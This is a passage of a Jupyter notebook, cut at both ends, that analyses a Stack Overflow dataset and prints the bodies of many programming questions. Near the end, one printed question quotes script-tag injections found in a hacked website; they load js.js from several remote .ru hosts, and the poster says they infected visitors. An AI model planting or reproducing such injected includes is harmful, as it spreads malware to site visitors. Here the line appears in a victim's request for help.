e+xUdV2Hb1gE17K8hu/zZE3gjIqZXt7DU56zI50Rp3mulaJFfGR5kd+i8SXbXxFlp3gVk/zAAzcmqMCYDzwOb11NcfcguA18GXkqP/sCJwIlpnVOBSWR3efwL2Kke4to87W9i2nfFOSuMS2QDT70NvAL0qMfXc02yD/51CubV+zkjS1QzgIVk39yOJWvbGg28lf6ul9btAfy1YNtj0vttMnB0PcU2may+uuK9VnGn30bAw8Ve+xLHdVt6D71M9uHXrmpcafob/8elji3Nv7nivVWwbn2es5o+J0ryXnMXHmZmVlRjrXoyM7OcnCjMzKwoJwozMyvKicLMzIpyojAzs6KcKKzRkNRe0oOpx8wpkv4kaY0VvI/9JXUqmL5A0p4roNx+kh6qYdm0evzxoDVCThTWKKQfKN0HPBARWwJbAi3IettckfYn68UTgIg4NyL+sYL3YVavnCissdgdWBARfwOIiMXAL8l+Sd5S0mBJf6pYWdJDkvql53tJGifpRUn3pP51kHSppNdSx3VXSNqJrK+py9MYBN+WdLOkH6T195D0b2VjFNxUcTWTrgh+m8p/RdLWxQ5E0vqSRqWyrqf6vnvMVhgnCmssOgMTCmdE1onaNGCLmjZKVTpnA3tG1sHbeOA0SeuRdS3ROSK2BS6KiH+S/Yr49IjoGhFvF5TTnOzXvIdERBegKXBSwa7mpPKvA35dy7GcBzwTEd3S/jatZX2z5eJEYY2FqL6HzNq+jfcmq0p6VtlIZkcBHYBPgQXAXyUdCFTbT1KB7wBTI+LNNH0L2aA4FSo6dZsAdKylrF2A2wEi4u/AR7Wsb7ZcnCissZhE1t9NJUlrAxsC/yHrYrvw/6F5xWpkg7x0TY9OEXFsZGOU7EDWe+f+wKO17L+2hPRl+ruY7GqjNu57x+qNE4U1FqOBNSUdCSCpCdkYB3+KiC/IqqC6SlpN0iZ83SX0v4CdJW2RtltT0lapnWKdyLos/wXZuAkA88iGpqzqDaBjRTnAj4Gxy3gsTwGHp3j2JRvO0qxknCisUYis98sDgB9Ieousp9klEXFxWuVZYCpZj6VXkA10RETMBgYDwyS9TJY4tiZLBg+leWPJGsYhG47z9NTQ/O2C/S8AjgbukfQKsAT4yzIezm+BXSS9SNZF9LvLWI5ZLu491hqldIfSMODAiJhQ2/pmjZkThZmZFeWqJzMzK8qJwszMinKiMDOzopwozMysKCcKMzMryonCzMyK+n8os1JBFiOMPQAAAABJRU5ErkJggg==\n",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x7f80c291ca58>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "N=20\n",
    "plt.bar(range(N), noAnswers[:N], align='center', alpha=0.5)\n",
    "#plt.xticks(y_pos, objects)\n",
    "\n",
    "plt.ylabel('Number of Answers per Question')\n",
    "plt.xlabel('Question Id')\n",
    "plt.title('Distribution of Answers per question ')\n",
    "plt.text(3,400,\"Avegrage answers per question \"+str(math.ceil((np.mean(noAnswers)))))\n",
    "\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Top 2 Questions with maximum number of answers \n",
      "\n",
      "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\n",
      "\n",
      "Please read the following before posting:\n",
      "\n",
      "\n",
      "Please post only ONE BOOK PER ANSWER.\n",
      "Please search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\n",
      "Please elaborate on why you think a given book is worth reading from a programmer's perspective.\n",
      "\n",
      "\n",
      "Note: this article is similar and contains other useful suggestions.\n",
      "\n",
      "................\n",
      "This is definitely subjective, but I'd like to try to avoid it becoming argumentative. I think it could be an interesting question if people treat it appropriately.\n",
      "\n",
      "The idea for this question came from the comment thread from my answer to the \"What are five things you hate about your favorite language?\" question. I contended that classes in C# should be sealed by default - I won't put my reasoning in the question, but I might write a fuller explanation as an answer to this question. I was surprised at the heat of the discussion in the comments (25 comments currently).\n",
      "\n",
      "So, what contentious opinions do you hold? I'd rather avoid the kind of thing which ends up being pretty religious with relatively little basis (e.g. brace placing) but examples might include things like \"unit testing isn't actually terribly helpful\" or \"public fields are okay really\". The important thing (to me, anyway) is that you've got reasons behind your opinions.\n",
      "\n",
      "Please present your opinion and reasoning - I would encourage people to vote for opinions which are well-argued and interesting, whether or not you happen to agree with them.\n",
      "\n",
      "................\n"
     ]
    }
   ],
   "source": [
    "print(\"Top 2 Questions with maximum number of answers \\n\")\n",
    "qid = answerid[:2] \n",
    "\n",
    "for b,id in zip(questions['Body'],questions['Id']):\n",
    "    if id in qid:\n",
    "        #print(id)\n",
    "        print(b)\n",
    "        print(\"................\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "ans=zip(answers['Body'],answers['ParentId'])\n",
    "ans=list(ans)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ans"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(90, 80),\n",
       " (80, 90),\n",
       " (180, 120),\n",
       " (260, 180),\n",
       " (260, 260),\n",
       " (330, 330),\n",
       " (260, 470),\n",
       " (260, 580),\n",
       " (470, 650),\n",
       " (180, 810)]"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x=zip(answers['ParentId'],questions['Id'])\n",
    "x=list(x)\n",
    "x[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Has anyone got experience creating SQL-based ASP.NET site-map providers?\\n\\nI've got the default XML file web.sitemap working properly with my Menu and SiteMapPath controls, but I'll need a way for the users of my site to create and modify pages dynamically.\\n\\nI need to tie page viewing permissions into the standard ASP.NET membership system as well.\\n\""
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "questions['Body'][2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Id</th>\n",
       "      <th>OwnerUserId</th>\n",
       "      <th>CreationDate</th>\n",
       "      <th>ParentId</th>\n",
       "      <th>Score</th>\n",
       "      <th>Body</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>92</td>\n",
       "      <td>61.0</td>\n",
       "      <td>2008-08-01T14:45:37Z</td>\n",
       "      <td>90</td>\n",
       "      <td>13</td>\n",
       "      <td>Version Control with Subversion\\r\\n\\r\\nA very ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>124</td>\n",
       "      <td>26.0</td>\n",
       "      <td>2008-08-01T16:09:47Z</td>\n",
       "      <td>80</td>\n",
       "      <td>12</td>\n",
       "      <td>I wound up using this. It is a kind of a hack,...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>199</td>\n",
       "      <td>50.0</td>\n",
       "      <td>2008-08-01T19:36:46Z</td>\n",
       "      <td>180</td>\n",
       "      <td>1</td>\n",
       "      <td>I've read somewhere the human eye can't distin...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>269</td>\n",
       "      <td>91.0</td>\n",
       "      <td>2008-08-01T23:49:57Z</td>\n",
       "      <td>260</td>\n",
       "      <td>4</td>\n",
       "      <td>Yes, I thought about that, but I soon figured ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>307</td>\n",
       "      <td>49.0</td>\n",
       "      <td>2008-08-02T01:49:46Z</td>\n",
       "      <td>260</td>\n",
       "      <td>28</td>\n",
       "      <td>Oleg Shilo's C# Script solution (at The Code P...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Id  OwnerUserId          CreationDate  ParentId  Score  \\\n",
       "0   92         61.0  2008-08-01T14:45:37Z        90     13   \n",
       "1  124         26.0  2008-08-01T16:09:47Z        80     12   \n",
       "2  199         50.0  2008-08-01T19:36:46Z       180      1   \n",
       "3  269         91.0  2008-08-01T23:49:57Z       260      4   \n",
       "4  307         49.0  2008-08-02T01:49:46Z       260     28   \n",
       "\n",
       "                                                Body  \n",
       "0  Version Control with Subversion\\r\\n\\r\\nA very ...  \n",
       "1  I wound up using this. It is a kind of a hack,...  \n",
       "2  I've read somewhere the human eye can't distin...  \n",
       "3  Yes, I thought about that, but I soon figured ...  \n",
       "4  Oleg Shilo's C# Script solution (at The Code P...  "
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "answers.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "xx=list(answers[answers['ParentId']==180]['Body'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "xx[2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "9"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(xx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xxx=list(questions[questions['Id']==180]['Body'])\n",
    "len(xxx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'conversations': [['as'], ['asss']]}"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d=dict()\n",
    "d['conversations']=[['as']]\n",
    "d['conversations'].append(['asss'])\n",
    "d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "'10' in d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "\n",
    "data = {}\n",
    "data['10'] = ['value']\n",
    "json_data = json.dumps(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# x_new=x[:1000]\n",
    "# for a,q in x_new:\n",
    "#     xxx=list(questions[questions['Id']==q]['Body'])\n",
    "#     xxx[0]\n",
    "#     if xxx[0] not in d:\n",
    "#         xx=list(answers[answers['ParentId']==q]['Body'])\n",
    "#         d[xxx[0]]=xx\n",
    "\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "I've written a database generation script in SQL and want to execute it in my Adobe AIR application:\n",
      "\n",
      "Create Table tRole (\n",
      "      roleID integer Primary Key\n",
      "      ,roleName varchar(40)\n",
      ");\n",
      "Create Table tFile (\n",
      "    fileID integer Primary Key\n",
      "    ,fileName varchar(50)\n",
      "    ,fileDescription varchar(500)\n",
      "    ,thumbnailID integer\n",
      "    ,fileFormatID integer\n",
      "    ,categoryID integer\n",
      "    ,isFavorite boolean\n",
      "    ,dateAdded date\n",
      "    ,globalAccessCount integer\n",
      "    ,lastAccessTime date\n",
      "    ,downloadComplete boolean\n",
      "    ,isNew boolean\n",
      "    ,isSpotlight boolean\n",
      "    ,duration varchar(30)\n",
      ");\n",
      "Create Table tCategory (\n",
      "    categoryID integer Primary Key\n",
      "    ,categoryName varchar(50)\n",
      "    ,parent_categoryID integer\n",
      ");\n",
      "...\n",
      "\n",
      "\n",
      "I execute this in Adobe AIR using the following methods:\n",
      "\n",
      "public static function RunSqlFromFile(fileName:String):void {\n",
      "    var file:File = File.applicationDirectory.resolvePath(fileName);\n",
      "    var stream:FileStream = new FileStream();\n",
      "    stream.open(file, FileMode.READ)\n",
      "    var strSql:String = stream.readUTFBytes(stream.bytesAvailable);\n",
      "    NonQuery(strSql);\n",
      "}\n",
      "\n",
      "public static function NonQuery(strSQL:String):void\n",
      "{\n",
      "    var sqlConnection:SQLConnection = new SQLConnection();\n",
      "    sqlConnection.open(File.applicationStorageDirectory.resolvePath(DBPATH);\n",
      "    var sqlStatement:SQLStatement = new SQLStatement();\n",
      "    sqlStatement.text = strSQL;\n",
      "    sqlStatement.sqlConnection = sqlConnection;\n",
      "    try\n",
      "    {\n",
      "        sqlStatement.execute();\n",
      "    }\n",
      "    catch (error:SQLError)\n",
      "    {\n",
      "        Alert.show(error.toString());\n",
      "    }\n",
      "}\n",
      "\n",
      "\n",
      "No errors are generated, however only tRole exists. It seems that it only looks at the first query (up to the semicolon- if I remove it, the query fails). Is there a way to call multiple queries in one statement?\n",
      "\n",
      "Are there any really good tutorials explaining branching and merging with Apache Subversion? \n",
      "\n",
      "All the better if it's specific to TortoiseSVN client.\n",
      "\n",
      "Has anyone got experience creating SQL-based ASP.NET site-map providers?\n",
      "\n",
      "I've got the default XML file web.sitemap working properly with my Menu and SiteMapPath controls, but I'll need a way for the users of my site to create and modify pages dynamically.\n",
      "\n",
      "I need to tie page viewing permissions into the standard ASP.NET membership system as well.\n",
      "\n",
      "This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.\n",
      "\n",
      "I have a little game written in C#. It uses a database as back-end. It's \n",
      "a trading card game, and I wanted to implement the function of the cards as a script.\n",
      "\n",
      "What I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\n",
      "\n",
      "Now, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\n",
      "\n",
      "Is that possible? Register a class from a source file and then instantiate it, etc.\n",
      "\n",
      "ICard Cards[current] = new MyGame.CardLibrary.Card056();\n",
      "Cards[current].OnEnterPlay(ref currentGameState);\n",
      "\n",
      "\n",
      "The language is C#, but extra bonus if it's possible to write the script in any .NET language.\n",
      "\n",
      "I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like play(), stop(), pause(), record() etc... Then I have workhorse classes which do the video decoding and video encoding. \n",
      "\n",
      "I just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.\n",
      "\n",
      "The book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.\n",
      "\n",
      "I've been writing a few web services for a .net app, now I'm ready to consume them. I've seen numerous examples where there is homegrown code for consuming the service as opposed to using the auto generated methods Visual Studio creates when adding the web reference. \n",
      "\n",
      "Is there some advantage to this?\n",
      "\n",
      "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\n",
      "Now, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\n",
      "\n",
      "Would you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\n",
      "\n",
      "Or - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\n",
      "\n",
      "And lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\n",
      "\n",
      "Now, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\n",
      "\n",
      "So, what are you using to automatically deploy SQL Server Databases from Test to Live?\n",
      "\n",
      "I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. \r\n",
      "\r\n",
      "I'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. \r\n",
      "\r\n",
      "I would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.\r\n",
      "\r\n",
      "A short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?\n",
      "I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\n",
      "\n",
      "\n",
      "This isn't possible\n",
      "This isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\n",
      "\n",
      "\n",
      "With that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \n",
      "\n",
      "And, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.\n",
      "\n",
      "What's the simplest way to connect and query a database for a set of records in C#?\n",
      "\n",
      "I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle, which is OK.\n",
      "\n",
      "For example, if the output of the page includes:\n",
      "\n",
      "&lt;input type=\"hidden\" name=\"__VIEWSTATE\" \n",
      "  id=\"__VIEWSTATE\" value=\"/wEPDwUJODU0Njc5MD...==\" /&gt;\n",
      "\n",
      "\n",
      "I need a way on the server side to get the value \"/wEPDwUJODU0Njc5MD...==\"\n",
      "\n",
      "To clarify, I need this value when the page is being rendered, not on PostBack. e.g. I need to know the ViewState value that is being sent to the client, not the ViewState I'm getting back from them.\n",
      "\n",
      "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().\n",
      "\n",
      "What is the correct way to get the process size on Solaris, HP-UX and AIX? Should we use top or ps -o vsz or something else?\n",
      "\n",
      "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\r\n",
      "\r\n",
      "I would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\n",
      "How can I retrieve the latest revision from subversion and use the value in CCNET?\r\n",
      "\r\n",
      "Edit: I'm not using NAnt - only MSBuild.\n",
      "I am looking to allow users to control of subdomain of an app I am toying with, much like Basecamp where it is customusername.seework.com.\n",
      "\n",
      "What is required on the DNS end to allow these to be created dynamically and be available instantly. \n",
      "\n",
      "And how do you recommend dealing with this in the logic of the site? Htaccess rule to  lookup the subdomain in the DB?\n",
      "\n",
      "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\r\n",
      "\r\n",
      "Now, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\r\n",
      "\r\n",
      "In short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\r\n",
      "\r\n",
      "What would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)\n",
      "I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.\n",
      "\n",
      "To that end, the \"Server Core\" option sounds appealing, but I'm not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the Microsoft website, but I don't see any indication about SQL Server.\n",
      "\n",
      "Does anyone know definitively?\n",
      "\n",
      "I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.\n",
      "\n",
      "If I'm adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?\n",
      "\n",
      "I don't want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.\n",
      "\n",
      "I know that I can do this through SQL Management Studio by going into their \"design\" mode for tables and dragging the order of columns around, but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.\n",
      "\n",
      "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\n",
      "\n",
      "I'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\n",
      "\n",
      "I realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\n",
      "\n",
      "Suggestions?\n",
      "\n",
      "Is it possible to create \"federated\" Subversion servers?\r\n",
      "As in one server at location A and another at location B that sync up their local versions of the repository automatically.  That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.\n",
      "PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?\n",
      "\n",
      "I want to get the MD5 Hash of a string value in SQL Server 2005. I do this with the following command:\n",
      "\n",
      "SELECT HashBytes('MD5', 'HelloWorld')\n",
      "\n",
      "\n",
      "However, this returns a VarBinary instead of a VarChar value. If I attempt to convert 0x68E109F0F40CA72A15E05CC22786F8E6 into a VarChar I get h *\\' instead of 68E109F0F40CA72A15E05CC22786F8E6.\n",
      "\n",
      "Is there any SQL-based solution?\n",
      "\n",
      "Yes\n",
      "\n",
      "I currently use a DataTable to get results from a database which I can use in my code.\n",
      "\n",
      "However, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.\n",
      "\n",
      "Is there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?\n",
      "\n",
      "I want to be able to do:For Each thing In things\r\n",
      "End For\r\n",
      "\r\n",
      "CLASSIC ASP - NOT .NET!\n",
      "How do you disable autocomplete in the major browsers for a specific input (or form field)?\n",
      "\n",
      "What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.\n",
      "A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?\n",
      "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?\n",
      "\n",
      "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\n",
      "\n",
      "This might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?\n",
      "\n",
      "When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?\n",
      "\n",
      "Let's say that we have an ARGB color:\n",
      "\n",
      "Color argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.\n",
      "\n",
      "\n",
      "When this is painted on top of an existing color, the colors will blend. So when it is blended with white, the resulting color is Color.FromARGB(255, 162, 133, 255);\n",
      "\n",
      "The solution should work like this:\n",
      "\n",
      "Color blend = Color.White; \n",
      "Color argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.      \n",
      "Color rgb = ToRGB(argb, blend); //Same as Color.FromARGB(255, 162, 133, 255);\n",
      "\n",
      "\n",
      "What is ToRGB's implementation?      \n",
      "\n",
      "How do I page results in SQL Server 2005?\n",
      "\n",
      "I tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\n",
      "\n",
      "What I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\n",
      "\n",
      "Any help would be much appreciated.\n",
      "\n",
      "I am getting the following error:\n",
      "\n",
      "\n",
      "  Access denied for user 'apache'@'localhost' (using password: NO)\n",
      "\n",
      "\n",
      "When using the following code:\n",
      "\n",
      "&lt;?php\n",
      "\n",
      "include(\"../includes/connect.php\");\n",
      "\n",
      "$query = \"SELECT * from story\";\n",
      "\n",
      "$result = mysql_query($query) or die(mysql_error());\n",
      "\n",
      "echo \"&lt;h1&gt;Delete Story&lt;/h1&gt;\";\n",
      "\n",
      "if (mysql_num_rows($result) &gt; 0) {\n",
      "    while($row = mysql_fetch_row($result)){\n",
      "          echo '&lt;b&gt;'.$row[1].'&lt;/b&gt;&lt;span align=\"right\"&gt;&lt;a href=\"../process/delete_story.php?id='.$row[0].'\"&gt;Delete&lt;/a&gt;&lt;/span&gt;';\n",
      "      echo '&lt;br /&gt;&lt;i&gt;'.$row[2].'&lt;/i&gt;';\n",
      "    }\n",
      "}\n",
      "else {\n",
      "   echo \"No stories available.\";\n",
      "}\n",
      "?&gt;\n",
      "\n",
      "\n",
      "The connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\n",
      "\n",
      "I have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.\n",
      "\n",
      "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\n",
      "\n",
      "I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\n",
      "\n",
      "So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\n",
      "\n",
      "I did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\n",
      "\n",
      "I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\n",
      "\n",
      "He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\n",
      "\n",
      "So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\n",
      "\n",
      "For the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n",
      "\n",
      "&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script 